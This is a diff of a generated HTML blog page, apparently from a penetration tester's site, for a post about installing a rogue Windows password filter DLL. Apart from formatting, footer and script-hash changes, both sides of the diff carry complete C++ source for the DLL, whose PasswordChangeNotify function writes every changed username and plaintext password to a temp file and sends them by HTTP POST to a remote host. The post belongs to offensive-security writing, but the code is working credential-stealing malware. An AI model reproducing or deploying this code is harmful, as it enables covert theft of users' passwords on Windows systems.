@@ -36,7 +36,7 @@ with the name of a DLL (without the extension) that you place in Windows\System3
 <meta itemprop="description" content="Password Filters [0] are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy. It is also fairly documented on how to Install and Register Password Filters [1]. Basically what it boils down to is updating a registry key here: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages
 with the name of a DLL (without the extension) that you place in Windows\System32\"><meta itemprop="datePublished" content="2013-09-11T00:28:31-05:00" />
 <meta itemprop="dateModified" content="2013-09-11T00:28:31-05:00" />
-<meta itemprop="wordCount" content="868">
+<meta itemprop="wordCount" content="871">
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Stealing passwords every time they change"/>
@@ -210,88 +210,88 @@ JackJohnson:a?'z_a4#RRK(mvQEsyQ8l`,JR.pes&lt;;6#0$puQ%Q&amp;,@ZwY(T@p
 <li>[2] <a href="%22http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx%22">http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx</a></li>
 </ul>
 <p>Full code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinInet.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntsecapi.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeToLog</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> szString)
-{
-    FILE<span style="color:#f92672">*</span> pFile <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">logFile.txt&#34;</span>, <span style="color:#e6db74">&#34;a+&#34;</span>);
-    <span style="color:#66d9ef">if</span> (NULL <span style="color:#f92672">==</span> pFile)
-    {
-        <span style="color:#66d9ef">return</span>;
-    }
-    fprintf(pFile, <span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, szString);
-    fclose(pFile);
-    <span style="color:#66d9ef">return</span>;
-}
-
-
-
-<span style="color:#75715e">// Default DllMain implementation
-</span><span style="color:#75715e"></span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>( HANDLE hModule, 
-                       DWORD  ul_reason_for_call, 
-                       LPVOID lpReserved
-                     )
-{
-    OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;DllMain&#34;</span>);
-    <span style="color:#66d9ef">switch</span> (ul_reason_for_call)
-    {
-        <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
-        <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
-        <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
-        <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
-            <span style="color:#66d9ef">break</span>;
-    }
-    <span style="color:#66d9ef">return</span> TRUE;
-}
-
-BOOLEAN <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">InitializeChangeNotify</span>(<span style="color:#66d9ef">void</span>)
-{
-    OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;InitializeChangeNotify&#34;</span>);
-    writeToLog(<span style="color:#e6db74">&#34;InitializeChangeNotify()&#34;</span>);
-    <span style="color:#66d9ef">return</span> TRUE;
-}
-
-BOOLEAN <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">PasswordFilter</span>(
-    PUNICODE_STRING AccountName,
-    PUNICODE_STRING FullName,
-    PUNICODE_STRING Password,
-    BOOLEAN SetOperation )
-{
-    OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PasswordFilter&#34;</span>);
-    <span style="color:#66d9ef">return</span> TRUE;
-}
-
-NTSTATUS <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">PasswordChangeNotify</span>(
-    PUNICODE_STRING UserName,
-    ULONG RelativeId,
-    PUNICODE_STRING NewPassword )
-{
-  FILE<span style="color:#f92672">*</span> pFile <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">logFile.txt&#34;</span>, <span style="color:#e6db74">&#34;a+&#34;</span>);
-  <span style="color:#75715e">//HINTERNET hInternet = InternetOpen(L&#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&#34;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
-</span><span style="color:#75715e"></span>	HINTERNET hInternet <span style="color:#f92672">=</span> InternetOpen(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&#34;</span>,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,<span style="color:#ae81ff">0</span>);
-	HINTERNET hSession <span style="color:#f92672">=</span> InternetConnect(hInternet,<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;172.16.10.1&#34;</span>,<span style="color:#ae81ff">80</span>,NULL,NULL,INTERNET_SERVICE_HTTP ,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
-	HINTERNET hReq <span style="color:#f92672">=</span> HttpOpenRequest(hSession,<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;POST&#34;</span>,<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;/&#34;</span>,NULL,NULL,NULL,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
-	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> pBuf<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SomeData&#34;</span>;
-
-
-
-	OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PasswordChangeNotify&#34;</span>);
-	<span style="color:#66d9ef">if</span> (NULL <span style="color:#f92672">==</span> pFile)
-    {
-        <span style="color:#66d9ef">return</span>;
-    }
-	fprintf(pFile, <span style="color:#e6db74">&#34;%ws:%ws</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, UserName<span style="color:#f92672">-&gt;</span>Buffer,NewPassword<span style="color:#f92672">-&gt;</span>Buffer);
-  fclose(pFile);
-	InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName<span style="color:#f92672">-&gt;</span>Buffer,UserName<span style="color:#f92672">-&gt;</span>Length<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>);
-	InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword<span style="color:#f92672">-&gt;</span>Buffer,NewPassword<span style="color:#f92672">-&gt;</span>Length<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>);
-	HttpSendRequest(hReq,NULL,<span style="color:#ae81ff">0</span>,pBuf,strlen(pBuf));
-
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-}
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinInet.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntsecapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">writeToLog</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> szString)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    FILE<span style="color:#f92672">*</span> pFile <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">logFile.txt&#34;</span>, <span style="color:#e6db74">&#34;a+&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (NULL <span style="color:#f92672">==</span> pFile)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    fprintf(pFile, <span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, szString);
+</span></span><span style="display:flex;"><span>    fclose(pFile);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Default DllMain implementation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>( HANDLE hModule, 
+</span></span><span style="display:flex;"><span>                       DWORD  ul_reason_for_call, 
+</span></span><span style="display:flex;"><span>                       LPVOID lpReserved
+</span></span><span style="display:flex;"><span>                     )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;DllMain&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (ul_reason_for_call)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOLEAN <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">InitializeChangeNotify</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;InitializeChangeNotify&#34;</span>);
+</span></span><span style="display:flex;"><span>    writeToLog(<span style="color:#e6db74">&#34;InitializeChangeNotify()&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOLEAN <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">PasswordFilter</span>(
+</span></span><span style="display:flex;"><span>    PUNICODE_STRING AccountName,
+</span></span><span style="display:flex;"><span>    PUNICODE_STRING FullName,
+</span></span><span style="display:flex;"><span>    PUNICODE_STRING Password,
+</span></span><span style="display:flex;"><span>    BOOLEAN SetOperation )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PasswordFilter&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">PasswordChangeNotify</span>(
+</span></span><span style="display:flex;"><span>    PUNICODE_STRING UserName,
+</span></span><span style="display:flex;"><span>    ULONG RelativeId,
+</span></span><span style="display:flex;"><span>    PUNICODE_STRING NewPassword )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  FILE<span style="color:#f92672">*</span> pFile <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">logFile.txt&#34;</span>, <span style="color:#e6db74">&#34;a+&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//HINTERNET hInternet = InternetOpen(L&#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&#34;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HINTERNET hInternet <span style="color:#f92672">=</span> InternetOpen(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&#34;</span>,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	HINTERNET hSession <span style="color:#f92672">=</span> InternetConnect(hInternet,<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;172.16.10.1&#34;</span>,<span style="color:#ae81ff">80</span>,NULL,NULL,INTERNET_SERVICE_HTTP ,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	HINTERNET hReq <span style="color:#f92672">=</span> HttpOpenRequest(hSession,<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;POST&#34;</span>,<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;/&#34;</span>,NULL,NULL,NULL,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> pBuf<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SomeData&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	OutputDebugString(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PasswordChangeNotify&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (NULL <span style="color:#f92672">==</span> pFile)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>	fprintf(pFile, <span style="color:#e6db74">&#34;%ws:%ws</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, UserName<span style="color:#f92672">-&gt;</span>Buffer,NewPassword<span style="color:#f92672">-&gt;</span>Buffer);
+</span></span><span style="display:flex;"><span>  fclose(pFile);
+</span></span><span style="display:flex;"><span>	InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName<span style="color:#f92672">-&gt;</span>Buffer,UserName<span style="color:#f92672">-&gt;</span>Length<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>	InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword<span style="color:#f92672">-&gt;</span>Buffer,NewPassword<span style="color:#f92672">-&gt;</span>Length<span style="color:#f92672">/</span><span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>	HttpSendRequest(hReq,NULL,<span style="color:#ae81ff">0</span>,pBuf,strlen(pBuf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
             </div>
         </article>
 
@@ -317,7 +317,7 @@ NTSTATUS <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -325,7 +325,7 @@ NTSTATUS <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -338,7 +338,7 @@ NTSTATUS <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
